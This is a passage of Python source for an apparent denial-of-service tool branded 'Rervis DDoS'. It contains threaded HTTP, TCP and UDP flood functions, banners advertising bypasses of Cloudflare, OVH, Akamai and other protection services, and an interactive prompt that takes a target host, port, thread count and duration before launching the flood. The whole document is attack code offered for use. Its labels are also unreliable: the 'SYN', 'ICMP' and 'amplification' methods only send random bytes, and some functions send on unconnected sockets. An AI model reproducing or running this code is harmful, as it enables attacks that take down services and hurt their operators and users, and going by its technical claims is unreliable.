                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def httpsplus(self, target, port, rpc, path):
        payload = self.generate_payload_httpsplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def wafplus(self, target, port, rpc, path):
        payload = self.generate_payload_wafplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def storm(self, target, port, rpc, path):
        payload = self.generate_payload_storm(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def stormplus(self, target, port, rpc, path):
        payload = self.generate_payload_stormplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def udp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(1024), (target, port))
                s.close()
            except:
                pass

    def tcp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(random._urandom(1024))
                s.close()
            except:
                pass

    def syn(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(random._urandom(400))
                s.close()
            except:
                pass

    def icmp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(3072), (target, port))
                s.close()
            except:
                pass

    def gudp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(random.randint(512, 1024)), (target, port))
                s.close()
            except:
                pass

    def udpplus(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(800), (target, port))
                s.close()
            except:
                pass

    def dns(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(23445), (target, port))
                s.close()
            except:
                pass

    def amp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(5617), (target, port))
                s.close()
            except:
                pass

    def flood(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(random._urandom(22065), (target, port))
                s.close()
            except:
                pass

    def handshake(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(random._urandom(random.randint(512, 1024)))
                s.close()
            except:
                pass

    def byudp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                for _ in range(rpc):
                    s.send(random._urandom(512))
                s.close()
            except:
                pass

    def rdp(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                for _ in range(rpc):
                    s.send(b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(22065))
                s.close()
            except:
                pass

    def craft(self, target, port, rpc, _):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                         b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                         b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                         b'\x73')
                for _ in range(rpc):
                    s.sendto(payload, (target, port))
                s.close()
            except:
                pass

    def start_attack(self, attack_type, method, target, port, threads, rpc, duration):
        methods = {
            'layer7': {
                'raw': self.raw,
                'bypass': self.bypass,
                'mix': self.mix,
                'cloud': self.cloud,
                'get': self.get,
                'uam': self.uam,
                'waf': self.waf,
                'ovh': self.ovh,
                'onec': self.onec,
                'sky': self.sky,
                'spoof': self.spoof,
                'post': self.post,
                'raw+': self.rawplus,
                'high': self.high,
                'uam+': self.uamplus,
                'tls': self.tls,
                'http/2': self.http2,
                'gurd': self.gurd,
                'kill': self.kill,
                'tlsv2': self.tlsv2,
                'null': self.null,
                'kill+': self.killplus,
                'https': self.https,
                'ir': self.ir,
                'war': self.war,
                'war+': self.warplus,
                'zeus': self.zeus,
                'by+': self.bypassplus,
                'pro': self.pro,
                'crash': self.crash,
                'https+': self.httpsplus,
                'waf+': self.wafplus,
                'storm': self.storm,
                'storm+': self.stormplus
            },
            'layer4': {
                'udp': self.udp,
                'tcp': self.tcp,
                'syn': self.syn,
                'icmp': self.icmp,
                'gudp': self.gudp,
                'udp+': self.udpplus,
                'dns': self.dns,
                'amp': self.amp,
                'flood': self.flood,
                'hand': self.handshake,
                'byudp': self.byudp,
                'rdp': self.rdp,
                'craft': self.craft
            }
        }
        
        if attack_type not in methods or method not in methods[attack_type]:
            print(f"{red}[!] Invalid attack type or method!")
            return

        parsed = urlparse(target if '://' in target else f'http://{target}')
        target_host = parsed.netloc or target
        path = parsed.path if parsed.path else "/"

        print(f"\n{green}[+] Starting {method} attack on {target_host}:{port}")
        print(f"{yellow}[+] Threads: {threads} | RPC: {rpc} | Duration: {duration}s\n")
        
        self.running = True
        threads_list = []
        
        for _ in range(threads):
            t = threading.Thread(
                target=methods[attack_type][method],
                args=(target_host, port, rpc, path)
            )
            t.daemon = True
            t.start()
            threads_list.append(t)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"\n{red}[!] Attack interrupted!")
        finally:
            self.stop_attack()
            for t in threads_list:
                t.join(timeout=1)

    def stop_attack(self):
        self.running = False
        print(f"{red}[!] Attack stopped")

def show_layer7_banner():
    print(f"""{cyan}
╔════════════════════════════════════════════════════════════════════════╗
║ {red}• {cyan}Layer{red}7 {blue}Methods: {magenta}                                                     {cyan}║
║                                                                        ║
║ {red}RAW    {cyan}( {green}HIGH PPS FLOOD {cyan}){yellow}                                              ║
║ {red}BYPASS {cyan}({green} FIREWALL BYPASS OVH, CLOUDFLARE, DDoS-GURD {cyan}){yellow}                  ║
║ {red}MIX    {cyan}( {green}HTTP HEAD FLOOD {cyan}){yellow}                                             ║
║ {red}CLOUD  {cyan}({green} BYPASS CLOUDFLARE NO-SEC, DDoS-GURD, OVH {cyan}){yellow}                    ║
║ {red}GET    {cyan}( {green}HTTP GET FLOOD {cyan}){yellow}                                              ║
║ {red}UAM    {cyan}({green} UAM BYPASS CLOUDFLARE {cyan}){yellow}                                       ║
║ {red}WAF    {cyan}({green} FIREWALL BYPASS {red}+ {cyan}){yellow}                                           ║
║ {red}OVH    {cyan}({green} OVH BYPASS METHOD {cyan}){yellow}                                           ║
║ {red}ONEC   {cyan}( {green}HIGH PPS FLOOD WITH CLOSE CONNECTION{cyan} ){yellow}                        ║
║ {red}SKY    {cyan}({green} GET COOKIE FLOOD {cyan}){yellow}                                            ║
║ {red}SPOOF  {cyan}({green} SPOOF HEADER GET METHOD {cyan}){yellow}                                     ║
║ {red}POST   {cyan}({green} POST BYPASS FLOOD {cyan}){yellow}                                           ║
║ {red}RAW+   {cyan}({green} GET FLOOD BYPASS {cyan}){yellow}                                            ║
║ {red}HIGH   {cyan}({green} HIGH PPS WITH COOKIE AND BYPASS FIREWALL {cyan}){yellow}                    ║
║ {red}UAM+   {cyan}({green} UAM BYPASS CLOUDFLARE {red}+ {cyan}){yellow}                                     ║
║ {red}TLS    {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF{cyan} ){yellow}                 ║
║ {red}HTTP/2 {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE{cyan} ){yellow}                                ║
║ {red}GURD   {cyan}({green} BYPASS DDoS-Gurd WAF {cyan}){yellow}                                        ║
║ {red}KILL   {cyan}({green} HIGH HTTP GET FLOOD{cyan} ){yellow}                                         ║
║ {red}TLSV2  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF WITH OUT COOKIE{cyan} ){yellow} ║
║ {red}NULL   {cyan}({green} NULL HEADERS FLOOD{cyan} ){yellow}                                          ║
║ {red}KILL+  {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE {red}+{cyan} ){yellow}                              ║
║ {red}HTTPS  {cyan}({green} HTTP HEADER FLOOD {red}+{cyan} ){yellow}                                         ║
║ {red}IR     {cyan}({green} BYPASS IRANIAN FIREWALL {cyan}){yellow}                                     ║
║ {red}WAR    {cyan}( {green}BYPASS AMAZON & VSHIELD WAF {cyan}){yellow}                                 ║
║ {red}WAR+   {cyan}( {green}BYPASS AMAZON & VSHIELD WAF WITH COOKIE {cyan}){yellow}                     ║
║ {red}ZEUS   {cyan}( {green}BYPASS AKAMAI & ALL WAFs {cyan}){yellow}                                    ║
║ {red}BY+    {cyan}({green} FIREWALL BYPASS OVH, CLOUDFLARE, DDoS-GURD {red}+{cyan} ){yellow}                ║
║ {red}PRO    {cyan}( {green}BYPASS FASLY WAF {cyan}){yellow}                                            ║
║ {red}CRASH  {cyan}( {green}BYPASS IRANIAN FIREWALLS {cyan}){yellow}                                    ║
║ {red}HTTPS+ {cyan}( {green}HTTPS GET FLOOD HTTP/1.2 VERSION WITH COOKIE{cyan} ){yellow}                ║
║ {red}WAF+   {cyan}({green} FIREWALL BYPASS {red}++ {cyan}){yellow}                                          ║
║ {red}STORM  {cyan}({green} BEST METHOD FOR DSTAT {cyan}){yellow}                                       ║
║ {red}STORM+ {cyan}({green} BEST METHOD FOR DSTAT {red}+ {cyan}){yellow}                                     ║
║ {red}Note {cyan}: {green}CTRL+Z to exit{yellow}                                                  ║
╚════════════════════════════════════════════════════════════════════════╝
""")

def show_layer4_banner():
    print(f"""{cyan}
╔════════════════════════════════════════════════════════════════════════╗
║ {red}• {cyan}Layer{red}4 {blue}Methods: {magenta}                                                     {cyan}║
║                                                                        ║
║ {red}UDP    {cyan}( {green}Send UDP packet to server {cyan}){yellow}                                   ║
║ {red}TCP    {cyan}( {green}Send TCP packet to server {cyan}){yellow}                                   ║
║ {red}SYN    {cyan}( {green}Send SYN packet to server {cyan}){yellow}                                   ║
║ {red}ICMP   {cyan}( {green}Send ICMP packet to server {cyan}){yellow}                                  ║
║ {red}GUDP   {cyan}( {green}Send GUDP packet to server {cyan}){yellow}                                  ║
║ {red}UDP+   {cyan}( {green}Send UDP packet to server {red}+ {cyan}){yellow}                                 ║
║ {red}DNS    {cyan}( {green}DNS amplification attack {cyan}){yellow}                                    ║
║ {red}AMP    {cyan}( {green}CharGEN amplification attack {cyan}){yellow}                                ║
║ {red}FLOOD  {cyan}( {green}OVH SERVER UDP FLOOD {cyan}){yellow}                                        ║
║ {red}HAND   {cyan}( {green}TCP HANDSHAKE FLOOD {cyan}){yellow}                                         ║
║ {red}RDP    {cyan}( {green}UDP FLOOD ON RDP VPS {cyan}){yellow}                                        ║
║ {red}CRAFT  {cyan}( {green}Minecraft SERVER ATTACK {cyan}){yellow}                                     ║
║ {red}Note {cyan}: {green}CTRL+Z to exit{yellow}                                                  ║
╚════════════════════════════════════════════════════════════════════════╝
""")

def logo():
    print(f"""{red}
    ██████╗ ███████╗██████╗ ██╗   ██╗██╗███████╗
    ██╔══██╗██╔════╝██╔══██╗██║   ██║██║██╔════╝
    ██████╔╝█████╗  ██████╔╝██║   ██║██║███████╗
    ██╔══██╗██╔══╝  ██╔══██╗╚██╗ ██╔╝██║╚════██║
    ██║  ██║███████╗██║  ██║ ╚████╔╝ ██║███████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝
{yellow}𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - @Team_God_Power | 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗞𝗶𝘀𝗮 | 𝗥𝗲𝗿𝘃𝗶𝘀 𝗗𝗗𝗼𝗦""")

def get_input():
    print(f"""{red}
    ██████╗ ███████╗██████╗ ██╗   ██╗██╗███████╗
    ██╔══██╗██╔════╝██╔══██╗██║   ██║██║██╔════╝
    ██████╔╝█████╗  ██████╔╝██║   ██║██║███████╗
    ██╔══██╗██╔══╝  ██╔══██╗╚██╗ ██╔╝██║╚════██║
    ██║  ██║███████╗██║  ██║ ╚████╔╝ ██║███████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝
{yellow}𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - @Team_God_Power | 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗞𝗶𝘀𝗮 | 𝗥𝗲𝗿𝘃𝗶𝘀 𝗗𝗗𝗼𝗦""")
    while True:
        layer = input("Enter attack layer (layer7/layer4/l7/l4): ").lower()
        if layer in ['layer7', 'l7']:
            show_layer7_banner()
            layer = 'layer7'
            break
        elif layer in ['layer4', 'l4']:
            show_layer4_banner()
            layer = 'layer4'
            break
        else:
            print(f"{red}[!] Invalid layer! Please enter 'layer7' or 'layer4'")

    method = input("Enter attack method: ")
    target = input("Enter target IP/hostname: ")
    
    while True:
        try:
            port = int(input("Enter target port: "))
            break
        except ValueError:
            print(f"{red}[!] Port must be a number!")

    while True:
        try:
            threads = int(input("Enter number of threads [500]: ") or "500")
            break
        except ValueError:
            print(f"{red}[!] Threads must be a number!")

    while True:
        try:
            rpc = int(input("Enter RPC count [10]: ") or "10")
            break
        except ValueError:
            print(f"{red}[!] RPC must be a number!")

    while True:
        try:
            duration = int(input("Enter attack duration in seconds [60]: ") or "60")
            break
        except ValueError:
            print(f"{red}[!] Duration must be a number!")

    return layer, method, target, port, threads, rpc, duration
    
    logo()
    print(f"{red}[!] Please provide valid arguments")
    sys.exit(1)

if __name__ == "__main__":
    tool = DDoSTool()
    try:
        layer, method, target, port, threads, rpc, duration = get_input()
        tool.start_attack(layer, method, target, port, threads, rpc, duration)
    except KeyboardInterrupt:
        tool.stop_attack()
    except Exception as e:
        print(f"{red}[!] Error: {str(e)}")
        sys.exit(1)